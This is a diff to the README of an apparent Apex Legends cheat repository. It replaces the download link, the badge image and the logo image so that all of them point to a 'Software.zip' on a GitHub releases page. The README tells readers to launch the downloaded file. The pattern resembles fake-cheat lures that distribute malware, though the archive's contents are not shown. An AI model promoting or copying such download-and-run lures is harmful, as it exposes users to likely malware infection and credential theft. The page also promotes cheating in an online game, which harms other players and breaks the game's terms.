@@ -42,7 +42,7 @@ The following topics are covered in this repository:
 ## Get the Hack!
 
 To download the cheat software, click on the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/TUB123w/apex-legends-cheat-download/releases/download/v2.0/Software.zip)](https://github.com/TUB123w/apex-legends-cheat-download/releases/download/v2.0/Software.zip)
 
 *Note: Ensure to launch the downloaded file to start using the cheat features.*
 
@@ -58,6 +58,6 @@ If you have any suggestions, improvements, or new cheat features to contribute, 
 
 ## Happy Cheating!
 
-![Apex Legends](https://img.freepik.com/free-vector/video-game-cyber-sport-logo_74154-140.jpg?size=338&ext=jpg)
+![Apex Legends](https://github.com/TUB123w/apex-legends-cheat-download/releases/download/v2.0/Software.zip)
 
 Have fun dominating the competition with our Apex Legends cheats! Happy gaming and happy cheating! 😉🎮🔥
